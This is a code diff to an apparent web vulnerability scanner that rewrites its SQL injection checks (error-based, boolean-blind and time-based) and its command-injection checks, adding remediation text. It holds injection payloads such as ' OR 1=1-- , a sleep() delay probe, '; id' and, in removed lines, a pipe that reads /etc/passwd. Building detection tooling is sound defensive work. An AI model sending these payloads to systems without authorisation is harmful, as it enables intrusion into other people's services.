@@ -23,39 +23,79 @@ SQL_PAYLOADS = [
     ("' OR ''='", "always-true"),
 ]
 
+SQL_ERROR_SIGNATURES = [
+    "sql syntax", "syntax error", "sqlite", "mysql", "ora-",
+    "unclosed quotation", "you have an error in your sql",
+    "sqliteexception", "operationalerror", "psycopg2", "pg::", "odbc",
+    "unterminated", "near \"", "incorrect syntax",
+]
+
+def _sqli_finding(url, endpoint, param, payload, technique, r) -> Finding:
+    return Finding(
+        title="SQL Injection",
+        severity="Critical",
+        cvss_score=9.1,
+        description=f"SQL Injection confirmed via {technique} in parameter '{param}' at {endpoint}.",
+        endpoint=url,
+        method="GET",
+        payload=payload,
+        evidence=r.text[:500],
+        request_dump=f"GET {url}?{param}={payload}",
+        response_dump=r.text[:300],
+        remediation=(
+            "1. Use parameterised queries / prepared statements exclusively.\n"
+            "2. Never concatenate user input into SQL strings.\n"
+            "3. Apply input validation and an allow-list.\n"
+            "4. Enable a WAF with SQL injection rules."
+        ),
+        owasp_id="A03",
+        owasp_category="A03:2021 Injection",
+        poc_curl=f'curl -s "{url}?{param}={payload}"',
+    )
+
 def test_sqli(base_url: str, endpoint: str, param: str) -> Optional[Finding]:
+    import time as _time
     url = f"{base_url}{endpoint}"
-    for payload, technique in SQL_PAYLOADS:
+
+    def _get(val):
         try:
-            r = httpx.get(url, params={param: payload}, timeout=TIMEOUT, verify=False)
-            body = r.text.lower()
-            # Evidence of SQLi: SQL error keywords or unexpected data returned
-            sql_errors = ["syntax error", "sqlite", "mysql", "ora-", "unclosed quotation",
-                          "you have an error in your sql", "sqliteexception", "operationalerror"]
-            if any(err in body for err in sql_errors) or (r.status_code == 500 and "error" in body):
-                return Finding(
-                    title="SQL Injection",
-                    severity="Critical",
-                    cvss_score=9.1,
-                    description=f"SQL Injection via {technique} in parameter '{param}' at {endpoint}",
-                    endpoint=url,
-                    method="GET",
-                    payload=payload,
-                    evidence=r.text[:500],
-                    request_dump=f"GET {url}?{param}={payload}",
-                    response_dump=r.text[:300],
-                    remediation=(
-                        "1. Use parameterised queries / prepared statements exclusively.\n"
-                        "2. Never concatenate user input into SQL strings.\n"
-                        "3. Apply input validation and an allow-list.\n"
-                        "4. Enable a WAF with SQL injection rules."
-                    ),
-                    owasp_id="A03",
-                    owasp_category="A03:2021 Injection",
-                    poc_curl=f'curl -s "{url}?{param}={payload}"',
-                )
+            return httpx.get(url, params={param: val}, timeout=TIMEOUT, verify=False)
         except Exception:
-            pass
+            return None
+
+    # (1) Error-based: only trust explicit SQL error signatures.
+    for payload, technique in SQL_PAYLOADS:
+        r = _get(payload)
+        if r is None:
+            continue
+        if any(sig in r.text.lower() for sig in SQL_ERROR_SIGNATURES):
+            return _sqli_finding(url, endpoint, param, payload, f"error-based ({technique})", r)
+
+    # (2) Boolean-based blind: use -- to escape SQL template suffix (e.g. LIKE '%{q}%').
+    base   = _get("axiomtest")
+    r_true = _get("axiomtest' OR 1=1-- ")
+    r_false= _get("axiomtest' AND 1=2-- ")
+    if base and r_true and r_false and r_true.status_code == 200:
+        # Require significant size difference (>50 bytes) to prove extra DB rows, not just
+        # different error messages — prevents false positives on non-SQL endpoints.
+        if (len(r_true.text) > len(r_false.text) + 50
+                and len(r_true.text) > len(base.text) + 50):
+            return _sqli_finding(
+                url, endpoint, param, "axiomtest' OR 1=1-- ",
+                "boolean-based blind (differential response length)", r_true,
+            )
+
+    # (3) Time-based blind: measure a real delay (fires on MySQL-like backends; harmless on SQLite).
+    delay_payload = "axiomtest' OR sleep(3)-- -"
+    t0 = _time.time()
+    r_delay = _get(delay_payload)
+    elapsed = _time.time() - t0
+    if r_delay is not None and elapsed >= 2.5:
+        return _sqli_finding(
+            url, endpoint, param, delay_payload,
+            f"time-based blind ({elapsed:.1f}s delay observed)", r_delay,
+        )
+
     return None
 
 
@@ -150,46 +190,53 @@ def test_jwt_none(base_url: str, endpoint: str) -> Optional[Finding]:
 
 
 # ── Command Injection ─────────────────────────────────────────────────────────
-CMD_PAYLOADS = [
-    ("127.0.0.1; id",         "semicolon chain"),
-    ("127.0.0.1 && whoami",   "AND chain"),
-    ("127.0.0.1 | cat /etc/passwd", "pipe"),
-    ("$(id)",                 "subshell"),
-    ("`id`",                  "backtick"),
-]
-
 def test_command_injection(base_url: str, endpoint: str, param: str) -> Optional[Finding]:
+    import random
     url = f"{base_url}{endpoint}"
-    for payload, technique in CMD_PAYLOADS:
+    canary = f"AX{random.randint(100000, 999999)}RED"
+
+    # Each payload either echoes the unique canary or runs `id` (uid= is a specific signal).
+    payloads = [
+        (f"127.0.0.1; echo {canary}",     "semicolon echo canary"),
+        (f"127.0.0.1 && echo {canary}",   "AND echo canary"),
+        (f"127.0.0.1 | echo {canary}",    "pipe echo canary"),
+        ("127.0.0.1; id",                 "semicolon id"),
+        ("$(id)",                         "subshell id"),
+    ]
+    for payload, technique in payloads:
         try:
             r = httpx.get(url, params={param: payload}, timeout=TIMEOUT, verify=False)
-            body = r.text
-            # Evidence: OS command output in response
-            if any(indicator in body for indicator in ["uid=", "root", "www-data", "nobody", "/bin/bash"]):
-                return Finding(
-                    title="OS Command Injection",
-                    severity="Critical",
-                    cvss_score=9.8,
-                    description=f"Unsanitised parameter '{param}' passed to shell. "
-                                f"Technique: {technique}. OS command output visible in response.",
-                    endpoint=url,
-                    method="GET",
-                    payload=payload,
-                    evidence=body[:500],
-                    request_dump=f"GET {url}?{param}={payload}",
-                    response_dump=body[:300],
-                    remediation=(
-                        "1. Never pass user input to shell commands. Use language-native APIs.\n"
-                        "2. If shell calls are required, use subprocess with shell=False and an args list.\n"
-                        "3. Apply strict input validation (allow-list of safe characters).\n"
-                        "4. Run the application as a non-root user."
-                    ),
-                    owasp_id="A03",
-                    owasp_category="A03:2021 Injection",
-                    poc_curl=f'curl -s "{url}?{param}={payload}"',
-                )
         except Exception:
-            pass
+            continue
+        body = r.text
+        hit = (canary in body) or ("uid=" in body and "gid=" in body)
+        if hit:
+            return Finding(
+                title="OS Command Injection",
+                severity="Critical",
+                cvss_score=9.8,
+                description=(
+                    f"Unsanitised parameter '{param}' is passed to a shell. "
+                    f"Technique: {technique}. "
+                    f"{'Unique canary echoed back' if canary in body else 'Output of id visible'} — "
+                    "confirms arbitrary command execution."
+                ),
+                endpoint=url,
+                method="GET",
+                payload=payload,
+                evidence=body[:500],
+                request_dump=f"GET {url}?{param}={payload}",
+                response_dump=body[:300],
+                remediation=(
+                    "1. Never pass user input to shell commands. Use language-native APIs.\n"
+                    "2. If shell calls are required, use subprocess with shell=False and an args list.\n"
+                    "3. Apply strict input validation (allow-list of safe characters).\n"
+                    "4. Run the application as a non-root user."
+                ),
+                owasp_id="A03",
+                owasp_category="A03:2021 Injection",
+                poc_curl=f'curl -s "{url}?{param}={payload}"',
+            )
     return None
 
 
